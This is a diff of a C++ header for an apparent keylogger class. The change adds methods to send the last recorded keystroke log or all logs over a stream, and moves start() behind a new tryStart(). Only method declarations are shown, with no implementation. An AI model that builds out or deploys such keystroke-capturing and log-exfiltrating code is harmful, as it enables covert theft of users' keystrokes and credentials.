@@ -6,20 +6,26 @@
 #include <string>
 #include <fstream>
 #include <atomic>
+#include <thread>
 
 #include "../stream/Stream.h"
 #include "../Time/Time.h"
+
 
 
 class KeyLogger {
 
 public:
     explicit KeyLogger(Stream stream);
-    void start();
     bool isRecordingKeys() const;
     void setRecordingKeys(bool isRecording);
-    void sendKeyLoggerLogs();
+    void sendKeyLoggerLog();
+    void sendAllKeyLoggerLogs() const;
+    bool lastLogExists();
+    bool logsExists();
+    void tryStart();
 private:
+    void start();
     const std::wstring pathOfLogs= L"Logs/";
     std::wstring logsFileName= generateLogName();
     Stream stream;
